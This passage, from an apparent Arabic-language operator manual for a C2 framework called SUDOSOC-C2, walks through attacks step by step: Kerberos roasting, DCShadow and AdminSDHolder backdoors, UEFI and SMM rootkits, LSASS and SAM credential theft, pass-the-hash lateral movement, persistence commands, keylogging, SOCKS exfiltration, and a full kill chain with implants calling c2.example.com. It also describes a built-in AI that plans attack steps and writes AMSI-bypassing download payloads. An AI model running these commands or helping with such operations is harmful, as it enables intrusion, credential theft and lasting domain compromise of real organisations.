```

#### ماذا يحقق؟
- passwords الـ service accounts كلها
- إذا كان service account له صلاحيات عالية → Domain Admin

---

### 6.3 AS-REP Roasting

#### ما هو؟

```
Kerberos Pre-authentication = آلية أمان افتراضية

إذا كانت معطّلة لـ user:
  أي شخص يمكنه طلب AS-REP للـ user هذا
  بدون معرفة كلمة المرور!
  
الـ AS-REP مُشفَّر بـ password hash الـ user
→ يمكن كسره offline
```

```bash
sudosoc (session) > asreproast
# يبحث تلقائياً عن accounts بدون pre-auth
# يُصدر hashes للـ offline cracking
```

#### الفرق عن Kerberoasting

| | Kerberoasting | AS-REP Roasting |
|--|--------------|-----------------|
| يستهدف | Service Accounts | User accounts |
| يحتاج مصادقة | نعم | لا |
| الـ hash نوع | RC4/AES | RC4 فقط |

---

### 6.4 DCShadow — Domain Controller المزيف

#### ما هو؟

```
MS-DRSR protocol يسمح لـ DCs بالتزامن
DCShadow يُسجّل جهاز الـ implant كـ DC مزيف في AD
ثم يُرسل objects مزيفة للـ DC الحقيقي

مثلاً:
  يُضيف مستخدماً للـ Domain Admins
  يُعدّل SIDHistory لمستخدم
  يُضيف ACE خبيثة
  كل هذا يبدو وكأنه جاء من DC شرعي
```

#### لماذا لا يُكتشف؟

```
الطبيعي: التغييرات في AD تولّد:
  Event ID 4728 (added to security group)
  Event ID 4732 (member added to privileged group)
  
DCShadow يتجاوز هذا لأن:
  التزامن يحدث على مستوى الـ replication protocol
  وليس عبر LDAP المعتاد الذي يُولّد events
```

```bash
sudosoc (session) > dcshadow --domain corp.local
# ثم تعديل attributes في AD بدون event logs
```

---

### 6.5 AdminSDHolder Backdoor

#### ما هو AdminSDHolder؟

```
AdminSDHolder = object خاص في AD
وظيفته: يحمي حسابات الـ privileged groups

كل 60 دقيقة، SDProp process:
  تأخذ الـ ACL من AdminSDHolder
  وتُطبّقها على كل privileged accounts
  (Administrator, Domain Admins, Enterprise Admins, إلخ)
```

#### كيف يستغله Phantom؟

```
Phantom يُضيف ACE للـ attacker_user على AdminSDHolder:
  GenericAll rights → Full control

60 دقيقة لاحقاً:
  SDProp يُطبّق هذه الـ ACE على كل الـ privileged accounts
  
النتيجة:
  attacker_user لديه Full Control على:
  • Administrator
  • Domain Admins group
  • Enterprise Admins group
  • Schema Admins group
  → Domain Compromise مضمون كل ساعة حتى بعد محاولة الإزالة
```

```bash
sudosoc (session) > adminsdholder --domain corp.local --user evil_user
```

#### لماذا هو persistence مثالي؟

```
المدافع يُزيل evil_user من Domain Admins
↓ 60 دقيقة لاحقاً
SDProp يُعيد الصلاحيات تلقائياً!
المدافع يعيد المحاولة... نفس النتيجة
```

---

## 7. الثبات على مستوى Hardware

### 7.1 UEFI Implant — أعمق مستوى في Firmware

#### ما هو UEFI؟

```
UEFI = Unified Extensible Firmware Interface
يعمل قبل الـ OS بالكامل

ترتيب الـ Boot:
  Power ON
    ↓
  UEFI Firmware (يعمل في EFI System Partition)
    ↓
  Windows Bootloader
    ↓
  Windows Kernel
    ↓
  Security Software (Defender, EDR, etc.)
```

#### كيف يعمل الـ UEFI Implant؟

```
Phantom يكتب DXE Driver في EFI System Partition:
  /EFI/Microsoft/Boot/bootmgfw.efi  ← يبدو كـ bootloader مشروع

DXE = Driver eXecution Environment
يعمل في المرحلة الثانية من UEFI Boot
قبل الـ OS بالكامل

عند كل إقلاع:
  UEFI يُحمّل الـ DXE driver
  الـ driver يُثبّت hook في الـ kernel قبل تحميله
  Windows يبدأ ← الـ hook موجود بالفعل
  Defender/EDR يبدأ ← لكن الـ hook موجود قبله!
```

#### ماذا يبقى بعد؟

| السيناريو | الـ Implant يبقى؟ |
|-----------|-----------------|
| إعادة تشغيل Windows | ✅ نعم |
| إعادة تثبيت Windows | ✅ نعم (EFI partition لم يتغير) |
| تغيير الـ Hard Drive | ✅ نعم (Firmware في الـ motherboard) |
| BitLocker Full Encryption | ✅ نعم (يعمل قبل التشفير) |
| Reflash الـ OS | ✅ نعم |
| Factory Reset | ✅ نعم |
| **Reflash UEFI Firmware** | ❌ لا |

```bash
sudosoc (session) > uefi --install --efi-path /boot/efi
# أو على Windows
sudosoc (session) > uefi --install --efi-path "C:\EFI"
```

---

### 7.2 SMM Rootkit — Ring -2

#### ما هو System Management Mode؟

```
حلقات الـ CPU (Privilege Rings):

Ring -2: SMM (System Management Mode)  ← أعمق مستوى
Ring -1: Hypervisor (VMX)
Ring 0:  Kernel (OS)
Ring 1:  Device Drivers (قديم)
Ring 2:  Device Drivers (قديم)
Ring 3:  User Applications
```

#### SMM خصائص فريدة

```
SMM يعمل في:
• ذاكرة خاصة معزولة (SMRAM) لا يراها الـ OS
• CPU mode منفصل تماماً
• الـ OS "يتوقف" أثناء SMM execution

يُفعَّل عبر: SMI (System Management Interrupt)
  إما hardware (مصادر H/W)
  أو software (كتابة على port 0xB2)
```

#### كيف يعمل الـ SMM Rootkit؟

```
Phantom:
1. يفتح SMRAM (عبر BYOVD أو vulnerability)
2. يُضيف Handler في SMRAM بجانب الـ handlers الأصليين
3. يُغلق SMRAM

عند كل SMI:
  CPU يدخل SMM
  الـ handler المزروع يُنفَّذ
  يُؤدي مهمته (استخراج بيانات، فحص الـ kernel، إلخ)
  ثم يُسلّم للـ handler الأصلي
  CPU يعود للـ OS

الـ OS لا يعلم بهذا أبداً ← SMRAM محمية بالـ hardware
```

#### لماذا لا يمكن اكتشافه؟

```
الـ OS (Windows/Linux) لا يمكنه:
  • قراءة SMRAM (محمية بـ SMRR registers)
  • منع SMI interrupts
  • فحص ما يحدث في SMM

حتى الـ Hypervisors لا ترى SMM execution
```

```bash
sudosoc (session) > smm --install
```

---

### 7.3 Rowhammer — ثغرة في الفيزياء ذاتها

#### ما هو Rowhammer؟

```
الـ DRAM (ذاكرة الجهاز) مبنية من صفوف من الـ capacitors

الثغرة:
  الوصول المتكرر السريع لصف معين (hammering)
  يُسبّب تسرب شحنة للصفوف المجاورة
  → قلب bits في الصفوف المجاورة!
```

#### كيف يستغلها Phantom؟

```
الهدف: قلب bit في صفحة الذاكرة المحمية للـ kernel

1. Phantom يُعرّف الذاكرة بحيث الهدف وصفحته في صفوف متجاورة
2. يُكثّف الوصول للصفوف المحيطة:
   for(;;) {
     access(row_above);
     access(row_below);
     clflush(row_above);   // تفريغ الـ cache
     clflush(row_below);
   }

3. بعد ملايين المحاولات:
   bit في صفحة الـ kernel ينقلب 0→1 أو 1→0

4. إذا كان الـ bit المستهدف في page table entry:
   R/W bit: 0 (read-only) → 1 (writable)
   الصفحة المحمية أصبحت قابلة للكتابة!

5. Phantom يكتب shellcode في الذاكرة المحمية
   → kernel code execution
```

#### لماذا لا يمكن اكتشافه؟

```
لا system call يُستدعى
لا memory allocation
لا write permission طُلبت
لا process injection

الـ security tools لا ترى شيئاً لأن لا شيء "يحدث" من منظورها
```

---

### 7.4 PCI-DMA Attack

#### ما هو؟

```
الأجهزة المتصلة بـ PCIe (بطاقات الشبكة، GPU، إلخ)
لها Direct Memory Access (DMA) للذاكرة

عادةً IOMMU يحمي الذاكرة من DMA unauthorized
لكن في حالات:
  IOMMU معطّل في الـ BIOS
  أو IOMMU misconfigured
  أو Thunderbolt/USB4 متصل
```

#### كيف يعمل الهجوم؟

```
Phantom يجد PCIe endpoint بـ DMA access:
  lspci -vvv | grep "DMA"

ثم يُرسل DMA requests مباشرة:
  read physical_address 0x00101000 → يقرأ kernel code
  write physical_address 0x00101000 → يكتب shellcode

→ تجاوز الـ OS، الـ Hypervisor، وكل security software
```

```bash
# قراءة الذاكرة الفيزيائية
sudosoc (session) > pcidma --read --phys-addr 0x1000000 --size 4096 --save /tmp/mem.bin

# كتابة shellcode
sudosoc (session) > pcidma --write --phys-addr 0x1000000 --data /tmp/shellcode.bin
```

---

## 8. محرك الـ Hypervisor — VMX Engine

### 8.1 بنية Intel VT-x

```
بعد تثبيت الـ Hypervisor:

┌─────────────────────────────────────────┐
│           Phantom VMX Engine            │ ← Ring -1 (VMX Root)
│         CPU في VMX Root Operation       │
│                                         │
│  يتحكم في كل:                          │
│  • Memory (EPT)                         │
│  • CPU registers                        │
│  • Interrupts                           │
└───────────────┬─────────────────────────┘
                │ VMLAUNCH / VMRESUME
┌───────────────▼─────────────────────────┐
│        Windows OS (Guest)               │ ← Ring 0 (VMX Non-Root)
│     يعمل كـ guest VM بدون علمه         │
│                                         │
│  ← Defender, EDR, Sysmon               │
│  ← يرى "نظام عادي"                     │
└─────────────────────────────────────────┘
```

### 8.2 EPT — Extended Page Tables

```
EPT = نسخة ثانية من الـ page tables للـ Hypervisor

Guest رأي:                    الواقع (EPT):
  Virtual → Physical        Physical → Host Physical
  0x1000 → 0x5000           0x5000  → 0x8000 (صفحة مختلفة!)

الاستخدامات:
1. إخفاء صفحات الذاكرة:
   EPT تُشير لصفحة فارغة بدلاً من الـ implant code
   → Memory scanner لا يجد شيئاً

2. Shadow Paging:
   Read من صفحة X  → يُرى الكود الأصلي
   Execute من صفحة X → يُنفَّذ الـ implant code
   → Anti-analysis مثالي
```

### 8.3 VM-Exit Trapping

```
في كل مرة الـ guest OS يُنفّذ:
  CPUID instruction
  RDMSR (قراءة MSR)
  WRMSR (كتابة MSR)
  I/O port access
  Specific syscalls
  
→ VM-Exit يحدث
→ Phantom يُعالج الـ exit
→ يمكن تعديل النتيجة قبل إعطائها للـ guest

مثال: تزوير CPUID
  Guest يسأل: "هل يدعم الـ CPU Hyper-V؟"
  Phantom يُجيب: "لا" (يُخفي وجوده)
```

```bash
# تثبيت الـ Hypervisor
sudosoc (session) > vmx --install

# التحقق من الحالة
sudosoc (session) > vmx --status

# EPT manipulation
sudosoc (session) > vmx --hide-memory --addr 0x10000 --size 0x1000
```

---

## 9. الأمن التشغيلي — OPSEC

### 9.1 Zero-Knowledge Proofs (ZKP)

```
المشكلة:
  الـ operator يُثبت هويته للـ server
  إذا أُرسلت كلمة المرور مباشرة → قابلة للاعتراض

الحل ZKP:
  الـ operator يثبت أنه يعرف الـ secret
  بدون الكشف عن الـ secret نفسه

مثال مبسّط (Schnorr Protocol):
  Server:  يُرسل تحدي r عشوائي
  Operator: يحسب response = secret + r * hash(...)
  Server:   يتحقق من الرياضيات بدون معرفة الـ secret

الاعتراض يحصل على: response ومعادلات رياضية
لكن لا يستطيع استخراج الـ secret منها
```

### 9.2 Ring Signatures

```
السيناريو:
  فريق من 5 مشغّلين (A, B, C, D, E)
  أحدهم وقّع أمراً خطيراً
  لكن لا أحد يجب أن يعرف أيهم

Ring Signature:
  أي عضو في المجموعة يمكنه إنشاء توقيع
  التوقيع صالح للمجموعة كلها
  مستحيل تحديد المُوقّع الفعلي

المستخدم في SUDOSOC-C2:
  أوامر موقّعة بـ ring signature للفريق
  لو اعتُرض الاتصال: يُعرَف أن شخصاً من الفريق أصدر الأمر
  لكن لا يُعرَف من بالضبط
```

### 9.3 Pedersen Commitments

```
المشكلة:
  الـ server يستقبل مهام من الـ operator
  ويُرسلها للـ implant
  → قد يُعدّلها (man-in-the-middle على الـ server نفسه)

الحل Pedersen Commitment:
  الـ operator يُنشئ commitment = hash(task || random_nonce)
  يُرسل الـ task للـ server + يحتفظ بالـ commitment
  
  الـ implant ينفّذ المهمة ويُرسل الإثبات
  الـ operator يتحقق: hash(نتيجة + nonce) = commitment؟
  
  إذا عدّل الـ server المهمة:
  Hash لن يُطابق → الـ operator يعلم بالتلاعب
```

### 9.4 TLS Certificate Randomization

```go
// من server/certs/subject.go
func randomOrganization() []string {
    adjective, _ := codenames.RandomAdjective()
    noun, _       := codenames.RandomNoun()
    suffix        := orgSuffixes[util.Intn(len(orgSuffixes))]
    // أمثلة: "Azure Cloud Systems, LLC"
    //        "Pacific Network Solutions, Inc."
    //        "Meridian Cloud Services, Ltd."
}
```

كل implant مُوَلَّد يحصل على certificate بـ organization عشوائية مختلفة → لا fingerprinting ممكن.

---

## 10. ما بعد الاختراق — Post-Exploitation

### 10.1 Network Reconnaissance

```bash
# فحص الشبكة
sudosoc (session) > ifconfig
sudosoc (session) > netstat
sudosoc (session) > arp                    # جيران الشبكة

# Scan الشبكة الداخلية
sudosoc (session) > execute "ping -n 1 192.168.1.1"

# Port scanning داخلي
sudosoc (session) > portfwd add --remote 192.168.1.5:445 --local 8445
# الآن يمكن scan المنفذ 8445 محلياً → يصل لـ 192.168.1.5:445
```

### 10.2 Credential Harvesting

```bash
# Memory dump لـ LSASS
sudosoc (session) > procdump --pid 624    # LSASS PID عادةً

# الـ dump يُحلَّل بـ Mimikatz محلياً:
# sekurlsa::minidump lsass.dmp
# sekurlsa::logonPasswords

# استخراج SAM database
sudosoc (session) > download C:\Windows\System32\config\SAM /tmp/
sudosoc (session) > download C:\Windows\System32\config\SYSTEM /tmp/

# تحليل SAM:
# impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

### 10.3 Lateral Movement

```bash
# Pass-the-Hash
sudosoc (session) > make-token Administrator <NTLM_HASH>
sudosoc (session) > execute "net use \\\\192.168.1.10\\admin$"

# PSExec عبر SUDOSOC-C2
sudosoc (session) > psexec --target 192.168.1.10 --user Administrator

# WMI Execution
sudosoc (session) > wmiexec --target 192.168.1.10

# Generate implant جديد للجهاز التالي
sudosoc > generate --mtls <IP> --os windows --format shellcode --save /tmp/next.bin
sudosoc (session) > upload /tmp/next.bin C:\Windows\Temp\
sudosoc (session) > execute "rundll32 C:\Windows\Temp\next.bin,EntryPoint"
```

### 10.4 Persistence (ثبات على مستوى OS)

```bash
# Registry Run Key
sudosoc (session) > execute "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v svcupdate /t REG_SZ /d C:\Users\Public\svc.exe"

# Scheduled Task
sudosoc (session) > execute "schtasks /create /tn SystemUpdate /tr C:\Windows\svc.exe /sc onlogon /ru SYSTEM"

# Windows Service
sudosoc (session) > execute "sc create SystemSvc binPath= C:\Windows\svc.exe start= auto"

# WMI Event Subscription (أصعب في الاكتشاف)
sudosoc (session) > execute "wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name='Update', EventNameSpace='root\cimv2', QueryLanguage='WQL', Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA Win32_PerfFormattedData_PerfOS_System'"

# COM Object Hijacking
sudosoc (session) > dllhijack --process explorer.exe --dll-path C:\Windows\version.dll
```

### 10.5 Data Exfiltration

```bash
# رفع ملفات مهمة
sudosoc (session) > download C:\Users\Admin\Documents\Passwords.xlsx /tmp/
sudosoc (session) > download C:\Users\Admin\Desktop\ /tmp/desktop/

# Clipboard (قد يحتوي على passwords)
sudosoc (session) > clipboard

# Screenshots
sudosoc (session) > screenshot
sudosoc (session) > screenshot --loot     # يحفظ في الـ loot

# Keylogging
sudosoc (session) > start-keylogger
# ... وقت لاحق ...
sudosoc (session) > stop-keylogger --loot
```

### 10.6 SOCKS5 Proxy — الشبكة الداخلية كاملة

```bash
# تشغيل SOCKS5 proxy
sudosoc (session) > socks5 start --port 1080

# الآن من جهاز المشغّل:
# proxychains nmap -sV 192.168.1.0/24
# proxychains crackmapexec smb 192.168.1.0/24
# proxychains firefox ← تصفح الشبكة الداخلية

# إيقاف الـ proxy
sudosoc (session) > socks5 stop
```

---

## 11. الـ Multiplayer والعمل الجماعي

### 11.1 بنية الـ Multiplayer

```
Operator A ─────────┐
                     ├──► sudosoc-server ══► Implants
Operator B ─────────┤
                     │
Operator C ──────────┘

كل الـ operators:
  • يرون نفس الـ sessions
  • يرون أوامر بعضهم في real-time
  • يتشاركون الـ loot
  • كل عملية مُسجَّلة في الـ audit log
```

```bash
# على Server — إنشاء operators
sudosoc [server] > new-operator --name alice --lhost 10.0.0.1
# يُولّد: alice_10.0.0.1.cfg

sudosoc [server] > new-operator --name bob   --lhost 10.0.0.1
# يُولّد: bob_10.0.0.1.cfg

# لكل operator على جهازه:
./sudosoc-client import alice_10.0.0.1.cfg
./sudosoc-client
```

### 11.2 الـ Audit Log

كل أمر يُنفَّذ يُسجَّل مع:
- اسم الـ operator
- وقت التنفيذ
- الأمر الكامل
- الـ session المستهدف
- النتيجة

موقعه: `~/.sudosoc/logs/sudosoc-c2.log`

---

## 12. الذكاء الاصطناعي المدمج

### 12.1 التكامل

```bash
# داخل الـ console
sudosoc > ai
# يفتح واجهة TUI تفاعلية

# مع context نشط
sudosoc (session) > ai
# الـ AI يعرف بيئة الهدف (OS, privileges, network)
```

### 12.2 الاستخدامات التقنية

```
"ما الخطوة التالية بعد الوصول لـ Domain User على Windows Server 2019؟"
→ الـ AI يقترح: Kerberoasting ← AS-REP Roasting ← LLMNR Poisoning

"ساعدني في كتابة payload يتجاوز AMSI ويُنزّل ملف"
→ يُقترح كود PowerShell مع obfuscation

"لدي NTLM hash للـ Administrator، ماذا يمكنني فعل؟"
→ Pass-the-Hash ← Over-Pass-the-Hash ← DCSync

"اكتب لي تقرير executive summary للاختراق"
→ يُولّد تقريراً احترافياً
```

### 12.3 الإعداد

```yaml
# ~/.sudosoc/configs/ai.yaml
providers:
  openai:
    api_key: "sk-..."
    model: "gpt-4o"
    temperature: 0.7
  
  # أو استخدام Ollama محلياً
  local:
    endpoint: "http://localhost:11434"
    model: "llama3.1:70b"
```

---

## 13. الامتدادات والـ BOF

### 13.1 ما هو BOF؟

```
BOF = Beacon Object File

ملف C مُترجَم كـ Position Independent Code
يُحمَّل مباشرة في ذاكرة الـ implant وينفذ
ثم يُزال من الذاكرة

الميزة:
  لا process جديد يُنشأ
  لا ملف على الـ disk
  الـ EDR لا يرى أي نشاط مريب
```

### 13.2 الاستخدام

```bash
# تثبيت BOF من الـ armory
sudosoc > armory install credtheft

# تشغيل BOF
sudosoc (session) > credtheft

# تحميل BOF محلي
sudosoc (session) > load-extension /path/to/cred_theft.json
sudosoc (session) > cred-theft --pid 624
```

### 13.3 BOFs المفيدة في الـ Armory

| BOF | الوظيفة |
|-----|---------|
| `credtheft` | سرقة credentials من الذاكرة |
| `adcs-enum` | فحص AD Certificate Services |
| `kerbeus` | هجمات Kerberos متقدمة |
| `situational-awareness` | جمع معلومات بيئة الهدف |
| `nanodump` | mini dump لـ LSASS |

---

## 14. Kill Chain — تسلسل الهجوم الكامل

### مثال عملي: اختراق شبكة مؤسسية

```
المرحلة 1: Initial Access
─────────────────────────
1. توليد implant مع multi-channel C2:
   sudosoc > generate --mtls c2.example.com --https c2-backup.example.com \
             --os windows --evasion --skip-symbols --format exe \
             --save /tmp/update.exe

2. إيصال الـ payload للضحية (Phishing/USB/Supply Chain)

3. الضحية تُشغّل update.exe
   → Session تظهر في الـ console:
   [*] Session d4a2b9c1 opened - CORP\jsmith@WORKSTATION-01

المرحلة 2: Discovery
──────────────────────
sudosoc (d4a2b9c1) > whoami
   → CORP\jsmith

sudosoc (d4a2b9c1) > getprivs
   → SeImpersonatePrivilege: Enabled ← مفيد جداً

sudosoc (d4a2b9c1) > ifconfig
   → 192.168.10.50 / 10.0.0.50

sudosoc (d4a2b9c1) > netstat
   → يرى الـ servers الداخلية

المرحلة 3: Privilege Escalation
──────────────────────────────────
sudosoc (d4a2b9c1) > getsystem
   → NT AUTHORITY\SYSTEM ← نجح!

المرحلة 4: Credential Access
──────────────────────────────
sudosoc (d4a2b9c1) > procdump --pid 624
   → lsass_20260101.dmp

# على جهاز المشغّل:
# pypykatz lsa minidump lsass_20260101.dmp
# → Administrator:aad3b435...32ed87bd (NTLM)
# → corp.local\sqlsvc:P@ssw0rd123 (cleartext!)

sudosoc (d4a2b9c1) > kerberoast
   → sqlsvc:$krb5tgs$23$... (crack offline)
   → webservice:$krb5tgs$23$...

المرحلة 5: Lateral Movement
─────────────────────────────
# Pass-the-Hash للـ DC
sudosoc (d4a2b9c1) > make-token Administrator <NTLM>
sudosoc (d4a2b9c1) > execute "net use \\\\10.0.0.1\\admin$"

# generate implant على DC
sudosoc > generate --mtls c2.example.com --os windows --format shellcode --save /tmp/dc.bin
sudosoc (d4a2b9c1) > upload /tmp/dc.bin \\10.0.0.1\admin$\dc.bin
sudosoc (d4a2b9c1) > execute "\\\\10.0.0.1\\admin$\\dc.bin"

[*] Session a9f3c2e1 opened - CORP\Administrator@DC-01

المرحلة 6: Domain Dominance
──────────────────────────────
sudosoc (a9f3c2e1) > dcsync --domain corp.local --all
   → كل الـ hashes! بما فيها krbtgt

# Golden Ticket! ← ملكية دائمة للـ domain
# impacket-ticketer -nthash <krbtgt_hash> -domain corp.local -domain-sid S-1-5... Administrator

المرحلة 7: Persistence
────────────────────────
# UEFI لأهم الأجهزة
sudosoc (a9f3c2e1) > uefi --install

# AdminSDHolder backdoor
sudosoc (a9f3c2e1) > adminsdholder --domain corp.local --user evil_user

# SMM rootkit على الـ DC
sudosoc (a9f3c2e1) > smm --install

المرحلة 8: Exfiltration
──────────────────────────
sudosoc (a9f3c2e1) > socks5 start --port 1080
# proxychains rsync -avz 10.0.0.50:/confidential/ /tmp/data/
```

---

## الخلاصة

SUDOSOC-C2 يُقدّم قدرات تغطي **كل مراحل** الهجوم:

```
Initial Access     → Phantom implants مع multi-channel C2
Execution          → Shell, Execute, BOF, .NET Assembly
Persistence        → UEFI, SMM, Registry, Services, COM Hijack
Privilege Escalation → BYOVD, PatchGuard, DSE, PPL bypass
Defense Evasion    → Indirect Syscalls, AMSI, ETW, Sleep Obfuscation
Credential Access  → LSASS dump, DCSync, Kerberoasting
Discovery          → netstat, ifconfig, ps, AD enumeration
Lateral Movement   → Pass-the-Hash, PSExec, WMI, SMB
Collection         → Download, Screenshot, Keylogger, Clipboard
Exfiltration       → SOCKS5, direct download, dead-drop
Impact             → VMX Hypervisor, Rowhammer, PCI-DMA
```

---

```
sudosoc-C2  |  Copyright (C) 2026  sudosoc — Seif
Precision adversary simulation. Zero compromise.
```
